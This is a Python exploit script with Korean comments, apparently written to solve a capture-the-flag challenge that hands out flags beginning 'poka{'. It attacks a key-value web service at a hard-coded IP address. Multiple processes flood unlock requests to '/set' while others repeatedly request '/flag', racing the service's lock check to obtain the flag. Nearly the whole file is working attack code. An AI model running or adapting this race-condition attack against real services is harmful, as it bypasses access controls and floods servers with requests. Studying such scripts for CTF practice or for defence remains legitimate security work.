#!/usr/bin/env python3
"""
Simple Multi-Process Race Condition Exploit
프로세스를 이용한 진짜 병렬 처리로 race condition 유발
"""

import requests
import multiprocessing
import time
import base64
import os

BASE_URL = "http://52.79.219.221:23001"

def setup_values(username):
    """초기값 설정"""
    session = requests.Session()
    
    # apple 설정
    session.get(f"{BASE_URL}/set", params={
        "key": f"{username}_apple",
        "value": "apple"
    })
    
    # banana 설정
    banana_encoded = base64.b64encode(b"banana").decode()
    session.get(f"{BASE_URL}/set", params={
        "key": f"{username}_banana", 
        "value": banana_encoded
    })
    
    print(f"Process {os.getpid()}: Values set up")

def spam_unlock_process(username, duration, process_id):
    """별도 프로세스에서 unlock 요청 스팸"""
    session = requests.Session()
    count = 0
    start_time = time.time()
    
    while time.time() - start_time < duration:
        try:
            session.get(f"{BASE_URL}/set", params={
                "key": f"{username}_locked",
                "value": "false"
            }, timeout=1)
            count += 1
        except:
            pass
    
    print(f"Process {process_id}: Sent {count} unlock requests")

def flag_request_process(username, delay, process_id):
    """별도 프로세스에서 플래그 요청"""
    time.sleep(delay)
    session = requests.Session()
    
    try:
        response = session.get(f"{BASE_URL}/flag", params={
            "username": username
        }, timeout=3)
        result = response.text
        print(f"Process {process_id} (delay {delay}s): {result}")
        
        if "poka{" in result:
            print(f"🎉 PROCESS SUCCESS! Flag found: {result}")
            return result
    except Exception as e:
        print(f"Process {process_id} error: {e}")
    
    return None

def multiprocess_attack(username):
    """멀티프로세스 공격"""
    print("Starting multiprocess attack...")
    
    processes = []
    
    # 10개의 프로세스에서 unlock 스팸
    for i in range(10):
        p = multiprocessing.Process(target=spam_unlock_process, args=(username, 15, f"unlock-{i}"))
        p.start()
        processes.append(p)
    
    # 다양한 지연시간으로 플래그 요청 프로세스들
    flag_processes = []
    for i in range(50):
        delay = i * 0.1  # 0초, 0.1초, 0.2초, ...
        p = multiprocessing.Process(target=flag_request_process, args=(username, delay, f"flag-{i}"))
        p.start()
        flag_processes.append(p)
    
    # 모든 플래그 요청 프로세스 완료 대기
    for p in flag_processes:
        p.join(timeout=10)
        if p.is_alive():
            p.terminate()
    
    # unlock 프로세스들 종료
    for p in processes:
        p.terminate()
        p.join(timeout=1)
    
    print("Multiprocess attack completed")

def simple_concurrent_attack(username):
    """간단한 동시 공격"""
    print("Starting simple concurrent attack...")
    
    # 백그라운드 unlock 프로세스 시작
    unlock_process = multiprocessing.Process(target=spam_unlock_process, args=(username, 30, "background"))
    unlock_process.start()
    
    # 메인에서 플래그 요청 반복
    for i in range(200):
        try:
            session = requests.Session()
            response = session.get(f"{BASE_URL}/flag", params={"username": username}, timeout=2)
            result = response.text
            print(f"Attempt {i+1}: {result}")
            
            if "poka{" in result:
                print(f"🎉 SIMPLE SUCCESS! Flag found: {result}")
                unlock_process.terminate()
                return result
                
            time.sleep(0.05)  # 50ms 간격
        except Exception as e:
            print(f"Attempt {i+1} error: {e}")
    
    unlock_process.terminate()
    unlock_process.join()
    return None

def main():
    if __name__ == "__main__":
        username = f"mp_user_{int(time.time())}"
        print(f"Using username: {username}")
        
        # 초기값 설정
        setup_values(username)
        
        # 간단한 동시 공격 먼저 시도
        result = simple_concurrent_attack(username)
        if result and "poka{" in result:
            print(f"\n🏆 FINAL RESULT: {result}")
            return
        
        # 멀티프로세스 공격 시도
        multiprocess_attack(username)
        
        print("\n💀 Multiprocess attack completed")

if __name__ == "__main__":
    multiprocessing.set_start_method('spawn', force=True)  # Windows 호환성
    main()